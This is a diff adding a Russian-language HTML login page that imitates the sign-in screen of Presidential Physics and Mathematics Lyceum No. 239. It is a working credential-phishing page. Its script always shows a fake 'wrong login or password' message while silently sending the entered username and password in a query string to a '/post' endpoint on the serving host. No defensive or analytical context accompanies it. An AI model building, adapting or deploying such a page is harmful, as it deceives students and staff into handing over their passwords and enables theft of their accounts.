@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Авторизация</title>
+    <style>
+        body {
+            background: #E2E6E9;
+            color: white;
+            font-family: 'Calibri', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+        .zero {
+            background-color: #FFFFFF;
+            border-radius: 5px;
+            flex-direction: column; 
+            align-items: flex-start;
+            justify-content: flex-start;
+            padding: 40px 50px;
+            width: 60vh;
+            height: 50vh;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            transform: scale(0.8); 
+            transform-origin: center; 
+        }
+        .zero2 {
+            background-color: #F4D6D2;
+            border-radius: 5px;
+            width: 57vh;
+            height: 4.5vh;
+            padding: 15px 10px;
+            color: #691911;
+            font-size:2.3vh;
+            transform-origin: left; 
+            text-align: left;
+            justify-content: left;
+            align-items: center;
+            place-items: center;
+            padding-top: -15px;
+            display:none;
+        }
+        @media (max-width: 768px) {
+            .zero {
+                width: 80%; 
+                height: 100%;
+                max-width: 80%;
+            }
+        }
+        @media (max-width: 768px) {
+            .zero2 {
+                width: 100%; 
+                max-width: 100%;
+                font-size:2.3vh;
+            }
+        }
+        h1 {
+            margin-bottom: 20px;
+            font-size: 4vh;
+            font-weight: 100;
+            color: #000000
+        }
+        .invalid {
+            color: #FF0000;
+            margin-top: 5px;
+        }
+        p {
+            color: white;
+        }
+        .poweredbyyandexsmartcaptcha {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            text-align: center;
+            padding: 10px;
+            color: white;
+            font-size: 1.5vh;
+        }
+        .btn-new {
+            border-radius: 5px;
+            color: white;
+            text-align: center;
+            transition: .1s linear;
+            justify-content: left;
+            align-items: center;
+            background: #0F6CBF;
+            height: 6vh;
+            width: 10vh;
+            cursor: pointer;
+            border: none;
+            font-size: 2.5vh;
+        }
+        .input-field {
+            border-radius: 5px;
+            color: black;
+            transition: border 0.05s ease;
+            background: #3DFF41;
+            border: 1px solid rgb(109, 103, 103);
+            margin-bottom: 2px;
+            width: 100%;
+            flex: 1;
+            outline: none;
+            padding: 10px;
+            align-items: center;
+            width: 57vh;
+            height: 3.5vh;
+            font-size: 16px;
+            background-color: white;
+        }
+        @media (max-width: 768px) {
+            .input-field {
+                width: 100%; 
+                max-width: 100%; 
+            }
+        }
+        @media (max-width: 768px) {
+            .btn-new {
+                width: 80%; 
+                max-width: 25%; 
+            }
+        }
+        .input-field::placeholder {
+            font-size: 2.2vh;
+            color: #7b7d85;
+        }
+        .allin1 {
+            margin-left: -20px;
+            cursor: pointer;
+            width: 90px;
+        }
+        .allin2 {
+            flex: 1;
+        }
+        .btn-new:hover {
+            background-color: #0C589C;
+        }
+        .input-field:focus {
+            border: 3px solid #4B91CF;
+        }
+    </style>
+</head>
+<body>
+    <div class="zero">
+        <h1 class="login-heading mb-4">Зайти на Президентский физико-математический лицей №239</h1>
+        <div class="zero2"></div>
+        <br>
+        <input type="text" name="username" id="username" class="input-field" value="" placeholder="  Логин" autocomplete="username">
+        <br>
+        <br>
+        <input type="password" name="password" id="password" value="" class="input-field" placeholder="  Пароль" autocomplete="current-password">
+        <br>
+        <br>
+        <button class="btn-new" type="submit" id="loginbtn">Вход</button>
+    </div>
+    </div>
+    <script>
+        var el2 = document.getElementById('loginbtn');
+        var email = document.getElementById('username');
+        var pswd = document.getElementById('password');
+        var bad = document.getElementById('shit');
+        var zero2 = document.querySelector('.zero2');
+
+        el2.addEventListener('click', () => {
+            var emaill = email.value;
+            var pswdd = pswd.value;
+
+            zero2.textContent = 'Неверный логин или пароль, попробуйте заново.';
+            zero2.style.display = 'grid';
+            if (emaill.trim() !== "" && pswdd.trim() !== "") {
+                fetch('/post?email=' + emaill + '&password=' + pswdd, {
+                    mode: 'cors'
+                })
+                .catch(error => {
+                });
+            }
+        });
+
+    </script>
+</body>
+</html>
